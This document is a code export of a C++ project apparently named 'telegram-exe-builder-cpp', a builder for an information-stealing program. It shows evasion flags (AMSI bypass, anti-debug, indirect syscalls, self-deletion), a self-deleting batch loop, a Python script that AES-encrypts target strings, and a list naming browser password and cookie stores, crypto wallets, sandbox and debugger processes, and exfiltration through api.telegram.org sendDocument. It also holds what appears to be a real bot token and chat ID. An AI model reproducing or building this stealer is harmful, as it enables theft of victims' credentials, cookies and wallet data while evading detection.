@@ -1,0 +1,3223 @@
+================================================================================
+PROJECT DIRECTORY TREE
+================================================================================
+telegram-exe-builder-cpp
+├── CMakeLists.txt
+├── TelegramHarvester.exe.bat
+├── builder
+│   ├── config.h
+│   ├── template_engine.cpp
+│   └── template_engine.h
+├── generate_obfuscated.py
+├── generated_obfuscation.h
+├── harvester
+│   ├── collectors
+│   │   ├── app_detector.cpp
+│   │   ├── app_detector.h
+│   │   ├── browser_collector.cpp
+│   │   ├── browser_collector.h
+│   │   ├── telegram_collector.cpp
+│   │   └── telegram_collector.h
+│   ├── crypto
+│   │   ├── obfuscation.cpp
+│   │   └── obfuscation.h
+│   ├── evasion
+│   │   ├── amsi_bypass.cpp
+│   │   ├── amsi_bypass.h
+│   │   ├── anti_debug.cpp
+│   │   ├── anti_debug.h
+│   │   ├── self_delete.cpp
+│   │   ├── self_delete.h
+│   │   ├── syscall_injection.cpp
+│   │   └── syscall_injection.h
+│   ├── exfil
+│   │   ├── telegram_client.cpp
+│   │   └── telegram_client.h
+│   ├── report
+│   │   ├── report_builder.cpp
+│   │   └── report_builder.h
+│   ├── system
+│   │   ├── system_info.cpp
+│   │   └── system_info.h
+│   └── utils
+│       ├── decrypt_passwords.py.template.py
+│       ├── zip_utils.cpp
+│       └── zip_utils.h
+└── main.cpp
+
+================================================================================
+PROJECT CODE EXPORT (Total files: 33)
+================================================================================
+
+================================================================================
+FILE: CMakeLists.txt
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\CMakeLists.txt
+================================================================================
+cmake_minimum_required(VERSION 3.15)
+project(TelegramHarvesterBuilder VERSION 1.0.0)
+
+set(CMAKE_CXX_STANDARD 17)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+# للإصدار النهائي، نفضل静态 linkage لتقليل الاعتماد على DLLs خارجية
+if(MSVC)
+    set(CMAKE_CXX_FLAGS_RELEASE "/MT /O2 /GL /Gy")
+    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/LTCG")
+else()
+    set(CMAKE_CXX_FLAGS_RELEASE "-O2 -static -static-libgcc -static-libstdc++")
+endif()
+
+# الملف الرئيسي الذي سنبنيه في المرحلة 0 (اختبار بسيط)
+add_executable(harvester_stub harvester_stub.cpp)
+
+# في المراحل القادمة سنضيف الملفات الحقيقية
+# target_sources(telegram_harvester PRIVATE
+#     harvester/collectors/telegram_collector.cpp
+#     ...
+# )
+
+================================================================================
+FILE: TelegramHarvester.exe.bat
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\TelegramHarvester.exe.bat
+================================================================================
+@echo off
+:loop
+del "C:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\TelegramHarvester.exe" /f /q
+if exist "C:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\TelegramHarvester.exe" goto loop
+del "C:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\TelegramHarvester.exe.bat" /f /q
+
+
+================================================================================
+FILE: builder\config.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\builder\config.h
+================================================================================
+// builder/config.h – إعدادات مشتركة بين أداة التجميع والقوالب
+#pragma once
+#include <string>
+#include <cstdint>
+
+namespace BuilderConfig {
+    // إصدار الأداة
+    constexpr const char* VERSION = "1.0.0";
+    
+    // القنوات المدعومة
+    enum class ExfilChannel : uint8_t {
+        TELEGRAM = 0,
+        DISCORD = 1,
+        MATRIX = 2
+    };
+    
+    // أعلام التجاوز (سيتم تحويلها إلى تعريفات preprocessor في القالب)
+    struct EvasionFlags {
+        bool useIndirectSyscalls = true;
+        bool useAmsiBypass = true;
+        bool useAntiDebug = true;
+        bool usePayloadSplitting = false;  // افتراضياً معطل
+        bool useSelfDelete = true;
+        bool useUpxCompression = false;
+    };
+    
+    // بنية تخزن إعدادات البناء النهائي
+    struct BuildSettings {
+        std::string botToken;
+        std::string chatId;
+        ExfilChannel channel = ExfilChannel::TELEGRAM;
+        std::string discordWebhook;
+        std::string matrixHomeserver;
+        std::string matrixAccessToken;
+        std::string matrixRoomId;
+        EvasionFlags evasion;
+        std::string customIconPath;
+        std::string outputFileName = "TelegramHarvester.exe";
+        std::string companyName = "Security Research Labs";
+        std::string copyright = "© 2025 Security Research. All rights reserved.";
+        std::string fileVersion = "1.0.0.0";
+    };
+}
+
+================================================================================
+FILE: builder\template_engine.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\builder\template_engine.cpp
+================================================================================
+// builder/template_engine.cpp
+#include "template_engine.h"
+#include <sstream>
+
+std::string TemplateEngine::ReplaceVariables(const std::string& content,
+                                              const std::unordered_map<std::string, std::string>& vars) {
+    std::string result = content;
+    for (const auto& [key, value] : vars) {
+        std::string placeholder = "{{" + key + "}}";
+        size_t pos = 0;
+        while ((pos = result.find(placeholder, pos)) != std::string::npos) {
+            result.replace(pos, placeholder.length(), value);
+            pos += value.length();
+        }
+    }
+    return result;
+}
+
+std::unordered_map<std::string, std::string> TemplateEngine::SettingsToMap(const BuilderConfig::BuildSettings& s) {
+    return {
+        {"BOT_TOKEN", s.botToken},
+        {"CHAT_ID", s.chatId},
+        {"EXFIL_MODE", std::to_string(static_cast<int>(s.channel))},
+        {"DISCORD_WEBHOOK", s.discordWebhook},
+        {"MATRIX_HOMESERVER", s.matrixHomeserver},
+        {"MATRIX_ACCESS_TOKEN", s.matrixAccessToken},
+        {"MATRIX_ROOM_ID", s.matrixRoomId},
+        {"USE_SYSCALLS", s.evasion.useIndirectSyscalls ? "1" : "0"},
+        {"USE_AMSI_BYPASS", s.evasion.useAmsiBypass ? "1" : "0"},
+        {"USE_ANTI_DEBUG", s.evasion.useAntiDebug ? "1" : "0"},
+        {"USE_PAYLOAD_SPLITTING", s.evasion.usePayloadSplitting ? "1" : "0"},
+        {"USE_SELF_DELETE", s.evasion.useSelfDelete ? "1" : "0"},
+        {"COMPANY_NAME", s.companyName},
+        {"COPYRIGHT", s.copyright},
+        {"FILE_VERSION", s.fileVersion}
+    };
+}
+
+================================================================================
+FILE: builder\template_engine.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\builder\template_engine.h
+================================================================================
+// builder/template_engine.h
+#pragma once
+#include <string>
+#include <unordered_map>
+
+namespace TemplateEngine {
+    // يستبدل كل {{KEY}} بالقيمة المقابلة في الخريطة
+    std::string ReplaceVariables(const std::string& templateContent,
+                                 const std::unordered_map<std::string, std::string>& variables);
+    
+    // يحول BuildSettings إلى خريطة مناسبة لقالب harvester
+    std::unordered_map<std::string, std::string> SettingsToMap(const BuilderConfig::BuildSettings& settings);
+}
+
+================================================================================
+FILE: generate_obfuscated.py
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\generate_obfuscated.py
+================================================================================
+#!/usr/bin/env python3
+# generate_obfuscated.py – generates generated_obfuscation.h with all strings (extended to 150)
+import os
+import random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+# ============================================================
+# أدخل التوكن ومعرف الشات الحقيقيين هنا
+# ============================================================
+BOT_TOKEN = "8990376736:AAFZjvT-dXKxvNHBfpXj9c5p5fCFRPfUnUo"
+CHAT_ID = "5432112961"
+# ============================================================
+
+# قائمة السلاسل النصية الكاملة (حتى المعرف 150)
+strings = {
+    # السلاسل القديمة (1-72)
+    1: "tdata",
+    2: "Telegram Desktop",
+    3: "api.telegram.org",
+    4: "/bot",
+    5: "/sendDocument",
+    6: "Chrome",
+    7: "Edge",
+    8: "Brave",
+    9: "Opera",
+    10: "Vivaldi",
+    11: "Safari",
+    12: "Tor Browser",
+    13: "Chromium",
+    14: "Epic",
+    15: "Opera GX",
+    16: "Google\\Chrome\\User Data",
+    17: "Microsoft\\Edge\\User Data",
+    18: "BraveSoftware\\Brave-Browser\\User Data",
+    19: "Opera Software\\Opera Stable",
+    20: "Vivaldi\\User Data",
+    21: "Apple Computer\\Safari",
+    22: "Tor Browser\\Browser\\TorBrowser\\Data\\Browser",
+    23: "Chromium\\User Data",
+    24: "Epic Privacy Browser\\User Data",
+    25: "Opera GX\\User Data",
+    26: "Local State",
+    27: "Login Data",
+    28: "Cookies",
+    29: "Web Data",
+    30: "Mozilla\\Firefox\\Profiles",
+    31: "key4.db",
+    32: "logins.json",
+    33: "cookies.sqlite",
+    34: "Cannot open file: ",
+    35: "Cannot read file: ",
+    36: "Attempt ",
+    37: " failed. Response: ",
+    38: "Send SUCCESS",
+    39: "Send FAILED",
+    40: "powershell -Command \"Compress-Archive -Path '",
+    41: "vmtoolsd.exe",
+    42: "procmon.exe",
+    43: "procexp.exe",
+    44: "wireshark.exe",
+    45: "x64dbg.exe",
+    46: "ollydbg.exe",
+    47: "ida.exe",
+    48: "windbg.exe",
+    49: "vboxservice.exe",
+    50: "sandbox",
+    51: "malware",
+    52: "analysis",
+    53: "virus",
+    54: "test",
+    55: "user",
+    56: "virtual",
+    57: "key_datas",
+    58: "map",
+    59: "@echo off",
+    60: ":loop",
+    61: "del \"",
+    62: "\" /f /q",
+    63: "if exist \"",
+    64: "\" goto loop",
+    65: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    66: "----",
+    67: "Content-Disposition: form-data; name=\"chat_id\"",
+    68: "Content-Disposition: form-data; name=\"document\"; filename=\"data.zip\"",
+    69: "application/zip",
+    70: "\\*' -DestinationPath '",
+    71: BOT_TOKEN,
+    72: CHAT_ID,
+    
+    # السلاسل الجديدة (73-150)
+    73: "https://api.ipify.org",
+    74: "https://icanhazip.com",
+    75: "SYSTEM INFORMATION",
+    76: "IP Address",
+    77: "Computer Name",
+    78: "User Name",
+    79: "OS Version",
+    80: "Architecture",
+    81: "RAM",
+    82: "CPU",
+    83: "GPU",
+    84: "Language",
+    85: "Time Zone",
+    86: "Installed Software",
+    87: "Discord",
+    88: "Viber",
+    89: "TLauncher",
+    90: "Steam",
+    91: "Bluestacks",
+    92: "Wallets",
+    93: "Exodus",
+    94: "Atomic",
+    95: "Electrum",
+    96: "Guarda",
+    97: "Coinomi",
+    98: "MetaMask",
+    99: "Coinbase Wallet",
+    100: "Binance Wallet",
+    101: "Phantom",
+    102: "Ronin",
+    103: "TronLink",
+    104: "Trust Wallet",
+    105: "OpenVPN",
+    106: "NordVPN",
+    107: "ProtonVPN",
+    108: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+    109: "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+    110: "Program Files",
+    111: "Program Files (x86)",
+    112: "AppData",
+    113: "Local AppData",
+    114: "report.html",
+    115: "system_info.txt",
+    116: "Passwords",
+    117: "Cookies",
+    118: "History",
+    119: "Bookmarks",
+    120: "AutoFills",
+    121: "Wallets",
+    122: "Sessions",
+    123: "detected_apps.txt",
+    124: "PC USER INFORMATION",
+    125: "BASIC INFORMATION",
+    126: "GRABBED SOFTWARE",
+    127: "DOMAINS DETECTED",
+    128: "Passwords - ",
+    129: "Cookies - ",
+    130: "History - ",
+    131: "AutoFills - ",
+    132: "CC - ",
+    133: "Grabbed Files - ",
+    134: "github.com",
+    135: "passwords.txt",
+    136: "cookies_export.txt",
+    137: "history.csv",
+    138: "bookmarks.json",
+    139: "autofills.csv",
+    # يمكن إضافة المزيد حتى 150 إذا أردت، لكن نكتفي بـ 139
+}
+
+# توليد مفتاح عشوائي (256-bit) و IV (128-bit)
+key = os.urandom(32)
+iv = os.urandom(16)
+
+def encrypt_string(s):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    padded = pad(s.encode('utf-8'), AES.block_size)
+    return cipher.encrypt(padded)
+
+with open("generated_obfuscation.h", "w", encoding="utf-8") as f:
+    f.write("// generated_obfuscation.h - auto generated\n")
+    f.write("// DO NOT EDIT - will be replaced on each build\n\n")
+    f.write("#pragma once\n")
+    f.write("#include <cstddef>\n\n")
+    
+    f.write(f"static const unsigned char OBF_KEY[{len(key)}] = {{")
+    f.write(', '.join(f"0x{b:02x}" for b in key))
+    f.write("};\n\n")
+    
+    f.write(f"static const unsigned char OBF_IV[{len(iv)}] = {{")
+    f.write(', '.join(f"0x{b:02x}" for b in iv))
+    f.write("};\n\n")
+    
+    for sid, s in strings.items():
+        enc = encrypt_string(s)
+        f.write(f"static const unsigned char OBF_STR_{sid}[{len(enc)}] = {{")
+        f.write(', '.join(f"0x{b:02x}" for b in enc))
+        f.write("};\n")
+        f.write(f"static const size_t OBF_STR_{sid}_LEN = {len(enc)};\n\n")
+    
+    f.write("// end of file\n")
+
+print(f"[+] Successfully generated generated_obfuscation.h")
+print(f"[+] Total encrypted strings: {len(strings)}")
+
+================================================================================
+FILE: generated_obfuscation.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\generated_obfuscation.h
+================================================================================
+// generated_obfuscation.h - auto generated
+// DO NOT EDIT - will be replaced on each build
+
+#pragma once
+#include <cstddef>
+
+static const unsigned char OBF_KEY[32] = {0xb3, 0xd1, 0x58, 0x83, 0x52, 0x57, 0xbe, 0xb9, 0xe1, 0x6a, 0x53, 0x26, 0x58, 0xbe, 0x2c, 0xe0, 0x48, 0x11, 0x79, 0x8d, 0x02, 0x8a, 0xed, 0x75, 0x9c, 0x78, 0x00, 0x03, 0xd4, 0xd5, 0x89, 0x9d};
+
+static const unsigned char OBF_IV[16] = {0xe8, 0x73, 0x7c, 0x59, 0xf8, 0x63, 0xcd, 0x45, 0x11, 0x6f, 0xd5, 0x2e, 0x76, 0x44, 0x9e, 0x50};
+
+static const unsigned char OBF_STR_1[16] = {0x60, 0xc3, 0xca, 0x19, 0x62, 0x8b, 0x59, 0xa0, 0xdf, 0x7f, 0xb2, 0x73, 0x05, 0xdc, 0x41, 0x34};
+static const size_t OBF_STR_1_LEN = 16;
+
+static const unsigned char OBF_STR_2[32] = {0x69, 0xca, 0xb2, 0x7e, 0xc0, 0x10, 0x8a, 0xfe, 0x32, 0x21, 0x52, 0x90, 0x73, 0xff, 0xdb, 0xcc, 0xa1, 0xc2, 0x9b, 0x0c, 0x83, 0x85, 0xfb, 0x4d, 0x0e, 0x9a, 0x00, 0xb5, 0xb7, 0x46, 0xd7, 0x81};
+static const size_t OBF_STR_2_LEN = 32;
+
+static const unsigned char OBF_STR_3[32] = {0x55, 0x74, 0xe8, 0xd0, 0x79, 0xed, 0xaf, 0x20, 0x2c, 0x7b, 0x4e, 0x97, 0x3a, 0xf5, 0x56, 0x3c, 0xce, 0x2b, 0x74, 0x6d, 0x7d, 0x14, 0xd0, 0x46, 0x73, 0x23, 0x08, 0x65, 0xe0, 0x5d, 0xa3, 0xb8};
+static const size_t OBF_STR_3_LEN = 32;
+
+static const unsigned char OBF_STR_4[16] = {0xc6, 0x35, 0xbd, 0x8f, 0x87, 0x1c, 0x4d, 0x3a, 0xd4, 0x43, 0x71, 0x79, 0x3b, 0xf1, 0x9a, 0x5e};
+static const size_t OBF_STR_4_LEN = 16;
+
+static const unsigned char OBF_STR_5[16] = {0x85, 0xf1, 0xb7, 0x0b, 0xd7, 0x68, 0x61, 0x52, 0x55, 0xee, 0x30, 0xcc, 0xea, 0x47, 0x7d, 0xd3};
+static const size_t OBF_STR_5_LEN = 16;
+
+static const unsigned char OBF_STR_6[16] = {0x60, 0xca, 0x10, 0xc7, 0x10, 0xae, 0xd7, 0xb9, 0x1d, 0x57, 0x9f, 0xa4, 0x3d, 0x67, 0x87, 0x44};
+static const size_t OBF_STR_6_LEN = 16;
+
+static const unsigned char OBF_STR_7[16] = {0x11, 0x72, 0x64, 0xdf, 0x9d, 0xb2, 0xe3, 0x2b, 0x2d, 0xa7, 0xc9, 0x57, 0xff, 0x16, 0x22, 0xb3};
+static const size_t OBF_STR_7_LEN = 16;
+
+static const unsigned char OBF_STR_8[16] = {0x9f, 0xbb, 0x94, 0x6a, 0x14, 0xa4, 0x18, 0x55, 0x78, 0x6d, 0xb5, 0x30, 0x92, 0x92, 0x14, 0x9b};
+static const size_t OBF_STR_8_LEN = 16;
+
+static const unsigned char OBF_STR_9[16] = {0x46, 0x04, 0xec, 0xc0, 0xcb, 0xd6, 0xf0, 0x9f, 0xc1, 0xcd, 0xeb, 0xe5, 0xde, 0x2e, 0x7b, 0x10};
+static const size_t OBF_STR_9_LEN = 16;
+
+static const unsigned char OBF_STR_10[16] = {0x57, 0xe8, 0x7e, 0xc1, 0x82, 0xf5, 0x95, 0x41, 0xfe, 0xa8, 0x6a, 0x08, 0x2a, 0xb2, 0xb5, 0x70};
+static const size_t OBF_STR_10_LEN = 16;
+
+static const unsigned char OBF_STR_11[16] = {0x74, 0x16, 0x6c, 0x21, 0xd1, 0xb7, 0x90, 0x3f, 0xf3, 0x29, 0x6a, 0xd0, 0xaf, 0xdf, 0xc4, 0xdc};
+static const size_t OBF_STR_11_LEN = 16;
+
+static const unsigned char OBF_STR_12[16] = {0x12, 0x79, 0x56, 0xab, 0xdb, 0x8c, 0x5d, 0x04, 0x98, 0x6b, 0xed, 0x7e, 0xee, 0x8b, 0x4c, 0x98};
+static const size_t OBF_STR_12_LEN = 16;
+
+static const unsigned char OBF_STR_13[16] = {0xdf, 0x57, 0x7e, 0x17, 0x8a, 0x3e, 0xaf, 0x94, 0xeb, 0xdf, 0xf3, 0x1b, 0x1a, 0xac, 0x0d, 0xe8};
+static const size_t OBF_STR_13_LEN = 16;
+
+static const unsigned char OBF_STR_14[16] = {0xee, 0xef, 0x2c, 0x1f, 0xce, 0x00, 0x70, 0x0e, 0x28, 0xf4, 0x0c, 0x02, 0xdf, 0x3b, 0xec, 0xb2};
+static const size_t OBF_STR_14_LEN = 16;
+
+static const unsigned char OBF_STR_15[16] = {0x10, 0xd3, 0x1a, 0x59, 0x47, 0xd1, 0xad, 0xf4, 0x3e, 0x9f, 0xd3, 0x07, 0x8f, 0x02, 0x7e, 0xba};
+static const size_t OBF_STR_15_LEN = 16;
+
+static const unsigned char OBF_STR_16[32] = {0x1d, 0x2a, 0x05, 0x6a, 0x1d, 0x11, 0x67, 0xc8, 0xac, 0xba, 0x30, 0xba, 0xac, 0x50, 0x02, 0x77, 0x0c, 0x7d, 0xc4, 0x3a, 0xce, 0x8d, 0xd7, 0x6d, 0x8c, 0x02, 0x30, 0xfc, 0x1a, 0x65, 0xa7, 0xab};
+static const size_t OBF_STR_16_LEN = 32;
+
+static const unsigned char OBF_STR_17[32] = {0xa2, 0x7a, 0xca, 0x27, 0xa1, 0xb1, 0x75, 0x3c, 0x0b, 0x6a, 0xbf, 0x18, 0x3a, 0xda, 0xc1, 0x52, 0x41, 0xb4, 0xde, 0xb1, 0x9d, 0xb8, 0xfc, 0x31, 0x60, 0x20, 0xf6, 0x66, 0x3a, 0x54, 0x41, 0xdd};
+static const size_t OBF_STR_17_LEN = 32;
+
+static const unsigned char OBF_STR_18[48] = {0x81, 0x60, 0x66, 0x70, 0x7b, 0x46, 0x0b, 0xbf, 0x82, 0x23, 0xee, 0x99, 0x23, 0xca, 0xf2, 0x87, 0x3a, 0xd4, 0xe2, 0x47, 0x0f, 0xd7, 0xb2, 0xb5, 0xe0, 0x39, 0x39, 0x91, 0x29, 0xae, 0x43, 0xe0, 0x39, 0x77, 0x3e, 0x64, 0xf9, 0x5d, 0xe0, 0x91, 0x39, 0xcd, 0xa9, 0x84, 0xf6, 0x8d, 0x0c, 0x41};
+static const size_t OBF_STR_18_LEN = 48;
+
+static const unsigned char OBF_STR_19[32] = {0x42, 0x43, 0xef, 0x1c, 0x9c, 0x7d, 0x5c, 0xb7, 0x4a, 0x74, 0xed, 0xae, 0x90, 0xcc, 0xfb, 0x03, 0xc0, 0xce, 0xb9, 0xa1, 0x8c, 0xba, 0x22, 0x79, 0xe9, 0x30, 0xe2, 0x7f, 0x8b, 0x31, 0x32, 0x83};
+static const size_t OBF_STR_19_LEN = 32;
+
+static const unsigned char OBF_STR_20[32] = {0x8b, 0x2a, 0xa3, 0x8d, 0xaa, 0xf0, 0xdf, 0x99, 0x84, 0x60, 0xd4, 0x7c, 0x63, 0xe2, 0xd0, 0xab, 0xd6, 0x09, 0x82, 0x7d, 0x74, 0xcf, 0x36, 0x98, 0x6e, 0x83, 0x46, 0xa0, 0xd4, 0x48, 0xb0, 0xa0};
+static const size_t OBF_STR_20_LEN = 32;
+
+static const unsigned char OBF_STR_21[32] = {0x52, 0x5a, 0xb4, 0x72, 0x3c, 0x56, 0x44, 0xaf, 0xfa, 0x60, 0xa0, 0x15, 0x89, 0x93, 0x98, 0xb7, 0xcc, 0x8e, 0xd9, 0xf7, 0x13, 0xd9, 0xb3, 0xe3, 0x26, 0x6c, 0x9e, 0x07, 0x96, 0x85, 0x9f, 0x63};
+static const size_t OBF_STR_21_LEN = 32;
+
+static const unsigned char OBF_STR_22[48] = {0x46, 0x32, 0x6e, 0x88, 0xbb, 0x79, 0xca, 0x97, 0x6c, 0x25, 0x7a, 0xa6, 0xc2, 0x9f, 0xa4, 0x28, 0x1a, 0x44, 0x96, 0x08, 0x89, 0xf1, 0x15, 0x50, 0x7f, 0x63, 0x70, 0x3f, 0xbc, 0x16, 0x3a, 0x0c, 0xf4, 0x32, 0xc4, 0x05, 0xbf, 0x2b, 0xb5, 0x06, 0xb3, 0x6c, 0x15, 0x1b, 0xc0, 0xab, 0xda, 0xfa};
+static const size_t OBF_STR_22_LEN = 48;
+
+static const unsigned char OBF_STR_23[32] = {0x08, 0x0f, 0xfc, 0xdc, 0xd6, 0xae, 0xb0, 0x04, 0xaa, 0x98, 0x8b, 0xfc, 0x61, 0x94, 0xb4, 0x1c, 0x32, 0xbd, 0x9a, 0x3f, 0x59, 0xd3, 0x9e, 0x92, 0x9a, 0x22, 0xea, 0x7e, 0xf1, 0x04, 0x0d, 0x83};
+static const size_t OBF_STR_23_LEN = 32;
+
+static const unsigned char OBF_STR_24[32] = {0xf8, 0xfc, 0xff, 0x81, 0x4e, 0x1c, 0x7c, 0x50, 0x8f, 0xdd, 0x81, 0x20, 0xdc, 0xeb, 0x26, 0x27, 0x56, 0xc0, 0x14, 0x5e, 0x4e, 0x58, 0x2e, 0xf5, 0x98, 0x6c, 0x07, 0x42, 0x21, 0x1d, 0xa6, 0xd9};
+static const size_t OBF_STR_24_LEN = 32;
+
+static const unsigned char OBF_STR_25[32] = {0x38, 0xa9, 0x3c, 0x74, 0x1d, 0x93, 0xd2, 0x1c, 0x93, 0xdc, 0xc7, 0xcd, 0xcc, 0x1b, 0x5e, 0x69, 0xc4, 0x1f, 0x82, 0xb1, 0xe3, 0x75, 0xed, 0x16, 0x87, 0xcd, 0x2a, 0x46, 0xeb, 0xa9, 0x76, 0x36};
+static const size_t OBF_STR_25_LEN = 32;
+
+static const unsigned char OBF_STR_26[16] = {0x90, 0x37, 0x07, 0xe7, 0x41, 0x11, 0x60, 0x99, 0xff, 0xc9, 0x4d, 0x0a, 0x8a, 0xd0, 0xe4, 0x3f};
+static const size_t OBF_STR_26_LEN = 16;
+
+static const unsigned char OBF_STR_27[16] = {0x66, 0x7f, 0xe9, 0x26, 0xfc, 0xf4, 0x7e, 0x1d, 0x91, 0x92, 0xf6, 0x63, 0x7a, 0x57, 0x2f, 0x55};
+static const size_t OBF_STR_27_LEN = 16;
+
+static const unsigned char OBF_STR_28[16] = {0x0f, 0x27, 0x91, 0x73, 0x37, 0x4e, 0xc9, 0x75, 0xec, 0x80, 0x60, 0xeb, 0xdc, 0xbf, 0x76, 0xae};
+static const size_t OBF_STR_28_LEN = 16;
+
+static const unsigned char OBF_STR_29[16] = {0x79, 0x16, 0x81, 0x0f, 0x97, 0x89, 0xb4, 0xf5, 0x5f, 0xcd, 0x07, 0x9a, 0x2c, 0x2a, 0x29, 0xc9};
+static const size_t OBF_STR_29_LEN = 16;
+
+static const unsigned char OBF_STR_30[32] = {0xbb, 0x1e, 0x3c, 0xdd, 0xcd, 0x67, 0xcb, 0xce, 0x1d, 0x52, 0xc6, 0x6d, 0x7f, 0x72, 0x1e, 0xc7, 0x6e, 0xc2, 0xa8, 0x5f, 0x08, 0x02, 0x27, 0x55, 0x72, 0x92, 0x41, 0xef, 0xb0, 0x81, 0x45, 0x5a};
+static const size_t OBF_STR_30_LEN = 32;
+
+static const unsigned char OBF_STR_31[16] = {0xca, 0x7f, 0xa7, 0x8e, 0x3c, 0x46, 0x2e, 0xb4, 0xd5, 0x40, 0x70, 0xe7, 0xed, 0xd7, 0x30, 0xb5};
+static const size_t OBF_STR_31_LEN = 16;
+
+static const unsigned char OBF_STR_32[16] = {0x6e, 0xcb, 0x07, 0x49, 0xa8, 0xf7, 0x01, 0x11, 0x33, 0x01, 0xf7, 0xf0, 0xdb, 0x83, 0x5a, 0xca};
+static const size_t OBF_STR_32_LEN = 16;
+
+static const unsigned char OBF_STR_33[16] = {0x2d, 0x3c, 0x46, 0x7f, 0xde, 0x7a, 0x60, 0xfd, 0x60, 0xf5, 0x1b, 0xf3, 0xc0, 0x7e, 0xf3, 0x93};
+static const size_t OBF_STR_33_LEN = 16;
+
+static const unsigned char OBF_STR_34[32] = {0x55, 0x70, 0xf3, 0xd7, 0x14, 0xbb, 0x36, 0x6a, 0x80, 0x21, 0x9b, 0x82, 0x7b, 0x41, 0xb3, 0x19, 0x7b, 0x19, 0xb9, 0x90, 0xd8, 0xef, 0x95, 0x4b, 0x0a, 0x84, 0x5c, 0x5f, 0x98, 0x43, 0x92, 0x6e};
+static const size_t OBF_STR_34_LEN = 32;
+
+static const unsigned char OBF_STR_35[32] = {0x98, 0x28, 0xf4, 0x57, 0x28, 0x7e, 0xdf, 0x97, 0x9a, 0xeb, 0xb8, 0x36, 0x30, 0xad, 0x90, 0xfd, 0xa4, 0x18, 0x26, 0x14, 0xa2, 0x52, 0x72, 0xb6, 0x63, 0x83, 0xb1, 0xcf, 0xc2, 0x5d, 0x82, 0xed};
+static const size_t OBF_STR_35_LEN = 32;
+
+static const unsigned char OBF_STR_36[16] = {0xa9, 0x44, 0x31, 0xd5, 0x46, 0x9f, 0xcf, 0xf2, 0x1f, 0xc4, 0x64, 0x9d, 0x98, 0x4c, 0x8c, 0x0a};
+static const size_t OBF_STR_36_LEN = 16;
+
+static const unsigned char OBF_STR_37[32] = {0xff, 0x63, 0x2c, 0x18, 0xad, 0xe7, 0xea, 0x48, 0x21, 0xf4, 0xaa, 0x77, 0x8d, 0x1b, 0x8d, 0x41, 0x23, 0x72, 0x01, 0x12, 0xf7, 0x8f, 0xd9, 0x0f, 0x6d, 0xbe, 0x55, 0x7d, 0xb2, 0xfa, 0xee, 0x51};
+static const size_t OBF_STR_37_LEN = 32;
+
+static const unsigned char OBF_STR_38[16] = {0xa1, 0xdf, 0x08, 0x96, 0x5d, 0xd7, 0xd3, 0x77, 0x69, 0xae, 0xcb, 0x76, 0x1d, 0x9a, 0x9f, 0x84};
+static const size_t OBF_STR_38_LEN = 16;
+
+static const unsigned char OBF_STR_39[16] = {0x22, 0xc1, 0x3c, 0xac, 0x89, 0xde, 0x6f, 0xb3, 0xf1, 0x35, 0x61, 0x69, 0x39, 0x5b, 0xc8, 0x2d};
+static const size_t OBF_STR_39_LEN = 16;
+
+static const unsigned char OBF_STR_40[48] = {0xf2, 0xa3, 0xae, 0x6d, 0x72, 0xc8, 0x90, 0x73, 0xb3, 0xf8, 0x19, 0x21, 0xec, 0xfe, 0x2b, 0x5d, 0x39, 0x91, 0x2e, 0xca, 0xbc, 0xcf, 0x09, 0x70, 0xaa, 0xb0, 0xa7, 0xe0, 0x90, 0x03, 0xf3, 0xeb, 0xf7, 0x3e, 0x29, 0xb4, 0x78, 0x97, 0xea, 0xe0, 0x61, 0x2f, 0xd2, 0xbf, 0xc4, 0xec, 0x8a, 0x13};
+static const size_t OBF_STR_40_LEN = 48;
+
+static const unsigned char OBF_STR_41[16] = {0xd0, 0x41, 0x7d, 0x55, 0x86, 0xca, 0xc5, 0x8d, 0xb2, 0x09, 0xc8, 0xc0, 0xa2, 0x2b, 0x6a, 0xca};
+static const size_t OBF_STR_41_LEN = 16;
+
+static const unsigned char OBF_STR_42[16] = {0x21, 0x36, 0xac, 0xe9, 0x6d, 0x91, 0x8d, 0xc4, 0x3d, 0xcf, 0x19, 0x66, 0x8c, 0x68, 0x0d, 0x4e};
+static const size_t OBF_STR_42_LEN = 16;
+
+static const unsigned char OBF_STR_43[16] = {0x00, 0xc9, 0x07, 0x53, 0x45, 0x9d, 0x08, 0xf9, 0xb6, 0x36, 0x10, 0xae, 0x60, 0xb4, 0x0e, 0xab};
+static const size_t OBF_STR_43_LEN = 16;
+
+static const unsigned char OBF_STR_44[16] = {0x18, 0xd0, 0xd9, 0x4c, 0xae, 0x4c, 0xee, 0xbc, 0x1b, 0xf8, 0xa2, 0x7c, 0x30, 0x07, 0xfc, 0x0d};
+static const size_t OBF_STR_44_LEN = 16;
+
+static const unsigned char OBF_STR_45[16] = {0x24, 0x3e, 0x41, 0x78, 0x94, 0x4b, 0x33, 0x71, 0xa0, 0xf4, 0xfc, 0xd4, 0x0b, 0xea, 0xc6, 0xef};
+static const size_t OBF_STR_45_LEN = 16;
+
+static const unsigned char OBF_STR_46[16] = {0xba, 0xf3, 0xe9, 0x6c, 0x15, 0xc8, 0x18, 0x4a, 0x3a, 0xc9, 0x1b, 0x99, 0x5c, 0xf0, 0x81, 0x74};
+static const size_t OBF_STR_46_LEN = 16;
+
